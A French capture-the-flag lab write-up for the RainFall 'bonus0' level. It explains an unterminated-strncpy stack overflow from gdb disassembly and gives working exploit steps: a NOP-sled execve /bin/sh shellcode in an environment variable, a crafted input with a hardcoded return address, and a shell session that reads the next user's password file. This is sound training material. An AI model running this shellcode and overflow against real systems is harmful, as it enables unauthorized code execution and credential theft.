En desassemblant le code avec gdb on voit que l'on a un read avec un buffer de 4096 suivi d'un strncpy avec un len de 20.

```gdb
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
=> 0x080484e1 <+45>:	call   0x8048380 <read@plt>
...
...
   0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:	mov    DWORD PTR [esp],eax
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
```

Strncpy a la particularité de ne pas ajouter de '\0' a la fin de la chaine copié si le buffer est plus long que la len passer en arguments.

A partir de la c'est facile.

On exporte un Shellcode avec des NOP pour augmenter les chances de tomber dessus

```bash
export SC=$(python -c "print('\x90' * 100 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')")
``

Il nous reste plus qu'a trouver l'adresse de la variable d'environnement SC == 0xbffffe9a

Premier read == 'B' * 4095 + '\n' == 4096 octets écrits
Deuxieme read == 'AAAAAAAAA' + '\x9a\xfe\xff\xbf' + 'CCCCCCCCC' == 20

```bash
bonus0@RainFall:~$ python -c "print('B' * 4095 + '\n' + 'BCDEFGHIJ' + '\x9a\xfe\xff\xbf' + 'CCCCCCC')" > /tmp/bonus0.txt
bonus0@RainFall:~$ cat /tmp/bonus0.txt - | ./bonus0
 -
 -
BBBBBBBBBBBBBBBBBBBBBCDEFGHIJ����CCCCCCC�� BCDEFGHIJ����CCCCCCC��
ls
ls: cannot open directory .: Permission denied
cat /home/user/bonus1/.pass
...
```
